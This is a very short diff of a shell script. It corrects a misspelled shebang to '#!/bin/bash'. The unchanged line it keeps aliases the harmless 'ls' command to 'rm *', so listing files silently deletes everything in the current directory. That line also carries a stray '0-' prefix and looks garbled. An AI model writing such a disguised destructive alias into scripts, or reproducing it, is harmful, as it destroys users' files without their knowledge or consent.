@@ -1,2 +1,2 @@
-#!/bin/bsh
+#!/bin/bash
 0-alias ls='rm *'
